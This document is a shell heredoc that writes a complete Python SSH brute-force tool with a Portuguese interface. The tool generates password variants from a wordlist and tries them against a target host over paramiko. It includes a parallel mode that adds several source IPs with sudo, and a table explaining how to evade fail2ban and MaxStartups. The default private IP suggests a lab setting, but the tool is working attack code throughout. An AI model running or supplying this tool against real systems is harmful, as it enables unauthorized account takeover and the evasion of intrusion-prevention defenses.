cat > ~/ssh_combos_menu.py << 'EOF'
#!/usr/bin/env python3
import itertools
import paramiko
import sys
import time
import subprocess
import socket
import multiprocessing
import string
import os

WORDLIST_DEFAULT = os.path.expanduser("~/wl_custom.txt")

def mostrar_tabela():
    print()
    print("=" * 70)
    print("  Tabela comparativa — fail2ban vs MaxStartups")
    print("=" * 70)
    print()
    print("  Definições:")
    print("    fail2ban     -> Bloqueia IPs após N tentativas falhadas (padrão: 5 em 10 min)")
    print("    MaxStartups  -> Aceita N conexões simultâneas não autenticadas (padrão: 10)")
    print("    Delay        -> Tempo entre tentativas da mesma instância")
    print("    Instâncias   -> Nº de conexões simultâneas do atacante")
    print()
    print("  " + "-" * 66)
    print("  | Cenário | fail2ban | MaxStartups | Inst | Delay | Bloqueia? | Aceita? |")
    print("  " + "-" * 66)
    print("  |    A    |  Ativo   |      10     |   1  |  10s  |    Sim    |   Sim   |")
    print("  |    B    |  Ativo   |      10     |   4  |  10s  |    Sim    |   Sim   |")
    print("  |    C    |  Ativo   |      10     |  10  |  10s  |    Sim    |   Lim   |")
    print("  |    D    |  Ativo   |      10     |  20  |  10s  |    Sim    |   Não   |")
    print("  |    E    |  Ativo   |      10     |   4  | 120s  |    Não    |   Sim   |")
    print("  |    F    | Inativo  |      10     |   4  |  10s  |    Não    |   Sim   |")
    print("  |    G    | Inativo  |      10     |  10  |  10s  |    Não    |   Lim   |")
    print("  |    H    | Inativo  |      10     |  20  |  10s  |    Não    |   Não   |")
    print("  |    I    | Inativo  |     100     |  50  |  10s  |    Não    |   Sim   |")
    print("  |    J    | Inativo  |     100     | 150  |   1s  |    Não    |   Não   |")
    print("  " + "-" * 66)
    print()
    print("  Resumo:")
    print("    - fail2ban ativo + delay < 120s  -> BLOQUEADO")
    print("    - fail2ban ativo + delay > 120s  -> Não bloqueado, mas LENTO")
    print("    - fail2ban inativo + inst <= 10  -> FUNCIONA")
    print("    - fail2ban inativo + inst > 10   -> MaxStartups DESCARTA")
    print()
    print("=" * 70)
    print()

def detetar_interface():
    try:
        r = subprocess.run(["ip", "-o", "link", "show"], capture_output=True, text=True)
        for linha in r.stdout.splitlines():
            if "lo:" in linha:
                continue
            partes = linha.split(":")
            if len(partes) >= 2:
                return partes[1].strip()
    except Exception:
        pass
    return "eth0"

def menu():
    print("=" * 50)
    print("  SSH Brute Force — Configuração")
    print("=" * 50)
    print()

    print("[1] IP do servidor:")
    ip_servidor = input("  IP [192.168.50.51]: ").strip() or "192.168.50.51"

    print()
    print("[2] Wordlist:")
    wordlist = input(f"  Ficheiro [{WORDLIST_DEFAULT}]: ").strip() or WORDLIST_DEFAULT
    if not os.path.isfile(wordlist):
        print(f"  Ficheiro não encontrado: {wordlist}")
        sys.exit(1)
    with open(wordlist, 'r', errors='ignore') as f:
        PALAVRAS = [linha.strip() for linha in f if linha.strip()]

    print()
    print("[3] Users a testar:")
    print("  (Escreve os users separados por vírgula)")
    print("  Exemplo: cyber,root")
    entrada = input("  Users [cyber,root]: ").strip() or "cyber,root"
    USERS = [u.strip() for u in entrada.split(",") if u.strip()]
    if not USERS:
        print("  Nenhum user válido.")
        sys.exit(1)

    print()
    print("[4] Delay entre tentativas (segundos):")
    print("  0) 0s (rápido, risco de bloqueio)")
    print("  1) 1s")
    print("  2) 5s")
    print("  3) 10s")
    print("  4) Personalizado")
    print("  (Ver tabela comparativa: opção 5)")
    op_d = input("  Escolhe [3]: ").strip() or "3"
    if op_d == "5":
        mostrar_tabela()
        op_d = input("  Escolhe [3]: ").strip() or "3"
    if op_d == "1":
        DELAY = 1
    elif op_d == "2":
        DELAY = 5
    elif op_d == "3":
        DELAY = 10
    elif op_d == "4":
        DELAY = int(input("  Delay personalizado (segundos): ").strip())
    else:
        DELAY = 10

    print()
    print("[5] Variações de maiúsculas/minúsculas:")
    print("  1) Só minúsculas (ex: coffee)")
    print("  2) Minúsculas + Capitalize (ex: coffee, Coffee)")
    print("  3) Minúsculas + Capitalize + MAIÚSCULAS")
    op_v = input("  Escolhe [1]: ").strip() or "1"
    VARIACOES = {"1": "lower", "2": "cap", "3": "all"}[op_v]

    print()
    print("[6] Números a usar:")
    print("  1) Nenhum")
    print("  2) Só 0-9")
    print("  3) 0-9 + comuns (00, 01, 10, 11, 12, 123, 1234, 2024, 2025, 2026)")
    print("  4) Todos (35 números)")
    op_n = input("  Escolhe [3]: ").strip() or "3"
    if op_n == "1":
        NUMEROS = [""]
    elif op_n == "2":
        NUMEROS = ["", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
    elif op_n == "3":
        NUMEROS = ["", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
                   "00", "01", "10", "11", "12", "123", "1234", "2024", "2025", "2026"]
    else:
        NUMEROS = ["", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
                   "00", "01", "10", "11", "12", "13", "20", "21", "22", "23",
                   "99", "100", "123", "1234", "12345", "123456", "2020", "2021",
                   "2022", "2023", "2024", "2025", "2026"]

    print()
    print("[7] Símbolos a usar:")
    print("  1) Nenhum")
    print("  2) Só !")
    print("  3) ! @ # $")
    print("  4) Todos (11 símbolos)")
    op_s = input("  Escolhe [3]: ").strip() or "3"
    if op_s == "1":
        SIMBOLOS = [""]
    elif op_s == "2":
        SIMBOLOS = ["", "!"]
    elif op_s == "3":
        SIMBOLOS = ["", "!", "@", "#", "$"]
    else:
        SIMBOLOS = ["", "!", "@", "#", "$", "%", "&", "*", ".", "_", "-"]

    print()
    print("[8] Posições das combinações:")
    print("  1) Só palavra + número + símbolo OU palavra + símbolo + número")
    print("  2) Prefixo + sufixo")
    print("  3) Todas as 6 posições")
    op_p = input("  Escolhe [1]: ").strip() or "1"
    POSICOES = {"1": 1, "2": 2, "3": 6}[op_p]

    print()
    print("[9] Prefixos e sufixos com letras:")
    print("  1) Nenhum")
    print("  2) Todas as letras (a-z, A-Z) como prefixo e sufixo")
    op_l = input("  Escolhe [1]: ").strip() or "1"
    if op_l == "1":
        LETRAS = [""]
    else:
        LETRAS = list(string.ascii_letters)  # a-z + A-Z

    print()
    print("[10] Modo de combinação:")
    print("  1) 1 palavra")
    print("  2) 2 palavras")
    op_m = input("  Escolhe [1]: ").strip() or "1"

    print()
    print("[11] Modo de execução:")
    print("  1) Single (1 processo)")
    print("  2) Paralelo (N processos com IPs diferentes)")
    op_e = input("  Escolhe [1]: ").strip() or "1"

    if op_e == "2":
        print()
        iface_detetada = detetar_interface()
        print(f"  Interface de rede detetada: {iface_detetada}")
        iface = input(f"  Interface [{iface_detetada}]: ").strip() or iface_detetada

        print()
        print("  IPs de origem:")
        print("  1) Gerar sequenciais (ex: 192.168.50.101, .102, ...)")
        print("  2) Inserir manualmente")
        op_ip = input("  Escolhe [1]: ").strip() or "1"

        if op_ip == "1":
            ip_base = input("  Prefixo dos IPs [192.168.50.]: ").strip() or "192.168.50."
            ip_min = input("  IP mínimo [101]: ").strip() or "101"
            ip_max = input("  IP máximo [104]: ").strip() or "104"
            IPS = [f"{ip_base}{i}" for i in range(int(ip_min), int(ip_max) + 1)]
        else:
            entrada = input("  IPs separados por vírgula: ").strip()
            IPS = [i.strip() for i in entrada.split(",") if i.strip()]

        n_inst = len(IPS)
        print(f"  A usar {n_inst} instâncias (uma por IP)")
        print()
        print("  Diretório de output:")
        home = os.path.expanduser("~")
        outdir = input(f"  [{home}/]: ").strip() or home
    else:
        n_inst = 1
        iface = None
        IPS = None
        outdir = None

    print()
    print("=" * 50)
    print("  Configuração:")
    print(f"  Servidor   : {ip_servidor}")
    print(f"  Wordlist   : {wordlist}")
    print(f"  Users      : {USERS}")
    print(f"  Delay      : {DELAY}s")
    print(f"  Variações  : {VARIACOES}")
    print(f"  Números    : {len(NUMEROS)}")
    print(f"  Símbolos   : {len(SIMBOLOS)}")
    print(f"  Posições   : {POSICOES}")
    print(f"  Letras     : {len(LETRAS)} (prefixo/sufixo)")
    print(f"  Modo       : {op_m} palavra(s)")
    print(f"  Execução   : {'Paralelo' if op_e == '2' else 'Single'} ({n_inst})")
    if op_e == "2":
        print(f"  Interface  : {iface}")
        print(f"  IPs        : {IPS}")
        print(f"  Output     : {outdir}/out_N.txt")
    print("=" * 50)
    input("  Prima Enter para começar...")

    return {
        "IP": ip_servidor,
        "PALAVRAS": PALAVRAS,
        "USERS": USERS,
        "DELAY": DELAY,
        "VARIACOES": VARIACOES,
        "NUMEROS": NUMEROS,
        "SIMBOLOS": SIMBOLOS,
        "POSICOES": POSICOES,
        "MODO": op_m,
        "OP_E": op_e,
        "N_INST": n_inst,
        "LETRAS": LETRAS,
        "IFACE": iface,
        "IPS": IPS,
        "OUTDIR": outdir,
    }

def variacoes_de(p, modo):
    if modo == "lower":
        return [p.lower()]
    if modo == "cap":
        return [p.lower(), p.capitalize()]
    return [p.lower(), p.capitalize(), p.upper()]

def combos_1_palavra(p, variacoes, numeros, simbolos, posicoes, letras):
    for v in variacoes_de(p, variacoes):
        for l in letras:
            for n in numeros:
                for s in simbolos:
                    if l:
                        yield l + v + n + s
                        yield v + n + s + l
                    if posicoes >= 1:
                        yield v + n + s
                        yield v + s + n
                    if posicoes >= 2:
                        yield s + n + v
                        yield n + s + v
                    if posicoes >= 6:
                        yield n + v + s
                        yield s + v + n

def combos_2_palavras(p1, p2, variacoes, numeros, simbolos, posicoes, letras):
    for v1 in variacoes_de(p1, variacoes):
        for v2 in variacoes_de(p2, variacoes):
            for l in letras:
                for n in numeros:
                    for s in simbolos:
                        if l:
                            yield l + v1 + v2 + n + s
                            yield v1 + v2 + n + s + l
                        if posicoes >= 1:
                            yield v1 + v2 + n + s
                            yield v1 + v2 + s + n
                        if posicoes >= 2:
                            yield v1 + n + v2 + s
                            yield n + v1 + v2 + s
                        if posicoes >= 6:
                            yield v1 + s + v2 + n
                            yield v2 + v1 + n + s
                            yield v2 + n + v1 + s

def gerar_todas(PALAVRAS, variacoes, numeros, simbolos, posicoes, modo, letras):
    vistos = set()
    todas = []
    if modo == "1":
        for p in PALAVRAS:
            for cand in combos_1_palavra(p, variacoes, numeros, simbolos, posicoes, letras):
                if cand not in vistos:
                    vistos.add(cand)
                    todas.append(cand)
    else:
        for p1, p2 in itertools.permutations(PALAVRAS, 2):
            for cand in combos_2_palavras(p1, p2, variacoes, numeros, simbolos, posicoes, letras):
                if cand not in vistos:
                    vistos.add(cand)
                    todas.append(cand)
    return sorted(todas)

def tentar(IP, user, pwd, src_ip=None):
    if src_ip:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.bind((src_ip, 0))
        except OSError:
            sock.close()
            return None
        try:
            sock.connect((IP, 22))
        except Exception:
            sock.close()
            return None
        transport = paramiko.Transport(sock)
    else:
        try:
            transport = paramiko.Transport((IP, 22))
            transport.start_client(timeout=5)
            transport.auth_password(user, pwd)
            transport.close()
            return True
        except paramiko.AuthenticationException:
            return False
        except Exception:
            return None
    try:
        transport.start_client(timeout=5)
        transport.auth_password(user, pwd)
        transport.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception:
        return None

def worker(IP, user, ip, delay, output, combos):
    output_f = open(output, "w")
    for pwd in combos:
        res = tentar(IP, user, pwd, ip)
        if res is True:
            msg = f"[+] PASSWORD ENCONTRADA: {user}:{pwd} (IP {ip})"
            print(msg)
            output_f.write(msg + "\n")
            output_f.close()
            return
        elif res is None:
            msg = f"[-] Erro de rede: {user}:{pwd} (IP {ip})"
            print(msg)
            output_f.write(msg + "\n")
        else:
            msg = f"[-] {user}:{pwd} (IP {ip})"
            print(msg)
            output_f.write(msg + "\n")
        if delay > 0:
            time.sleep(delay)
    output_f.close()

def correr_single(cfg):
    combos = gerar_todas(cfg["PALAVRAS"], cfg["VARIACOES"], cfg["NUMEROS"], cfg["SIMBOLOS"], cfg["POSICOES"], cfg["MODO"], cfg["LETRAS"])
    print(f"[*] Total de combinações: {len(combos):,}")
    for user in cfg["USERS"]:
        print(f"=== User: {user} ===")
        for pwd in combos:
            res = tentar(cfg["IP"], user, pwd)
            if res is True:
                print(f"\n[+] PASSWORD ENCONTRADA: {user}:{pwd}")
                sys.exit(0)
            elif res is None:
                print(f"[-] Erro de rede: {user}:{pwd}")
            else:
                print(f"[-] {user}:{pwd}")
            if cfg["DELAY"] > 0:
                time.sleep(cfg["DELAY"])

def correr_paralelo(cfg):
    todas = gerar_todas(cfg["PALAVRAS"], cfg["VARIACOES"], cfg["NUMEROS"], cfg["SIMBOLOS"], cfg["POSICOES"], cfg["MODO"], cfg["LETRAS"])
    total = len(todas)
    n_inst = cfg["N_INST"]
    print(f"[*] Total de combinações: {total:,}")
    print(f"[*] A dividir por {n_inst} instâncias...")

    partes = []
    tamanho = total // n_inst
    for i in range(n_inst):
        inicio = i * tamanho
        if i == n_inst - 1:
            fim = total
        else:
            fim = inicio + tamanho
        partes.append(todas[inicio:fim])
        print(f"  Instância {i+1}: {len(partes[i]):,} combinações")

    for i, ip in enumerate(cfg["IPS"]):
        subprocess.run(["sudo", "ip", "addr", "add", f"{ip}/24", "dev", cfg["IFACE"]],
                       stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    print(f"[*] {n_inst} IPs adicionados ao {cfg['IFACE']}")

    procs = []
    for i, ip in enumerate(cfg["IPS"]):
        output = f"{cfg['OUTDIR']}/out_{i+1}.txt"
        p = multiprocessing.Process(
            target=worker,
            args=(cfg["IP"], cfg["USERS"][0], ip, cfg["DELAY"], output, partes[i])
        )
        p.start()
        procs.append(p)

    print(f"[*] {n_inst} instâncias a correr em paralelo")
    for p in procs:
        p.join()

if __name__ == "__main__":
    cfg = menu()

    if cfg["OP_E"] == "2":
        correr_paralelo(cfg)
    else:
        correr_single(cfg)
EOF
